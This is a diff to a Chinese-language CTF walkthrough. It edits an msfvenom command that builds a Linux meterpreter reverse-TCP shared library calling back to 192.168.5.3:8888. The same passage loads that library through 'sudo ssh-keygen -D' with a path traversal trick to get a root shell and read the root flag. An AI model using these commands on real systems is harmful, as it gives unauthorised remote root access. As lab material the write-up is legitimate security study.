@@ -131,7 +131,7 @@ sudo ssh-keygen -D ./lib.so
 使用 msf 制作 so 文件，进行反弹：
 
 ```
-msfvenom LHOST=192.168.5.3 LPORT=8888 -p linux/x86/meterpreter/reverse_tcp -f elf-so > lib.so
+msfvenom LHOST=192.168.5.3 LPORT=8888 -p linux/x64/meterpreter/reverse_tcp -f elf-so > lib.so
 ```
 
 将 so 文件下载到目标机器的/tmp 文件夹中:
@@ -143,7 +143,7 @@ chmod 777 lib.so
 sudo -u root /usr/bin/ssh-keygen -D /opt/../tmp/lib.so
 ```
 
-执行后，得到反弹的 meterpreter，最终得到 root flag:
+执行后，得到反弹的 x64 meterpreter，最终得到 root flag:
 
 ```
 cat root.txt
